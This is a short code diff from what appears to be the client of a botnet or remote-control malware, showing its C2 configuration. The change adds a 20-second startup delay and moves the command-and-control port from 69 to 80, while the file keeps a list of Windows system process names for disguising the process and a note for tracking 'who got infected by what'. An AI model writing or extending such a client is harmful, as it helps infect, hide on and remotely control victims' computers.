@@ -6,10 +6,10 @@ import requests
 import sys
 import setproctitle #Future use
 import wsi # Future use
-
+time.sleep(20)
 # Configuration
 C2_ADDRESS  = '127.0.0.1'
-C2_PORT     = 69
+C2_PORT     = 80
 
 TITLE_LIST = ["Registry", "Windows Session Manager", "Windows Start-Up Application", "Windows Logon Application", "System", "Shell Infrastructure Host", "Services and Controller App"] #Future use
 NOTE = "Test client" #The note returned with the bots command, is nice for seeing who go infected by what. Also, don't remove this comment.
